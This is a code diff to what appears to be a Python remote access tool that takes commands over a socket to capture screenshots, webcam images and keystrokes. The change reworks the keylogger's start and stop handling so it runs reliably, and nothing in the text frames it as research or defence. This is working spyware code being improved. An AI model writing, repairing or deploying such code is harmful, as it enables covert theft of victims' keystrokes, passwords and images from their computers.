@@ -18,10 +18,6 @@ def log_keystroke(key):
     with open("log.txt", 'a') as f:
         f.write(key)
 
-def keylogger():
-    with Listener(on_press=log_keystroke) as l:
-        l.join()
-
 def screenshot():
     image = pyscreenshot.grab()
     date= datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")
@@ -42,7 +38,7 @@ def receive_data(s, p):
     try:
         pygame.init()
         pygame.camera.init()
-        keylogger_thread = threading.Thread(target=keylogger,daemon=True)
+        listener = None
         while 1:
             data = s.recv(1024)
             if len(data) > 0:
@@ -65,13 +61,15 @@ def receive_data(s, p):
                     else:
                         send_data_to_process(p,"No cam with this id\n".encode())
                 elif data.decode() == "key start\n": #Start the keylogger
-                    if not keylogger_thread.is_alive():
-                        keylogger_thread.start()
+                    if listener is None or not listener.is_alive():
+                        listener = Listener(on_press=log_keystroke)
+                        listener.start()
                         send_data_to_process(p,"Keylogger started\n".encode())
                     else:
                         send_data_to_process(p,"Keylogger is already running\n".encode())
                 elif data.decode() == "key stop\n": #Stop the keylogger
-                    keylogger_thread.join(1)
+                    if listener is not None:
+                        listener.stop()
                     send_data_to_process(p,"Keylogger is stopped\n".encode())
                 else:
                     send_data_to_process(p,data)
